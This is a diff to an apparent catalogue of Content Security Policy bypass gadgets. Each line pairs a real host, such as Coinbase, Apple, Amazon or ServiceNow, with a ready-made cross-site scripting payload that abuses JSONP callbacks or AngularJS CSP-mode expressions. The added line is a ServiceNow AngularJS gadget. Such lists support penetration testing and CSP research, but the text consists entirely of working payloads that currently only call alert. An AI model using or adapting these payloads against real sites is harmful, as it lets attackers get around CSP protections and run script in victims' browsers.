@@ -74,6 +74,7 @@ info.elastic.co	<script src="https://info.elastic.co/index.php/form/getForm?munc
 inno.blob.core.windows.net	<body ng-app ng-csp><script src="//inno.blob.core.windows.net/new/libs/AngularJS/1.2.1/angular.min.js"></script><div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{ [1].reduce(value.alert, 1); }}</div></div></div></body>
 investor.coinbase.com	<script src="https://investor.coinbase.com/feed/People.svc/GetPeopleList?callback=confirm(document.domain);"></script>
 itunes.apple.com	<script src="https://itunes.apple.com/se/rss/toppodcasts/json?callback=alert"></script>
+kbcprod.service-now.com	<body ng-app ng-csp><script src="https://kbcprod.service-now.com/scripts/angular_includes_1.5.11.jsx"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 lptag.liveperson.net	<script src="https://lptag.liveperson.net/lptag/api/account/1/configuration/applications/taglets/.jsonp?v=2.0&cb=alert(1)-"></script>
 m.media-amazon.com	<body ng-app ng-csp><script src="https://m.media-amazon.com/images/I/81cx8O4at9L.js"></script><input autofocus ng-focus="$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"></body>
 mango.buzzfeed.com	<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>
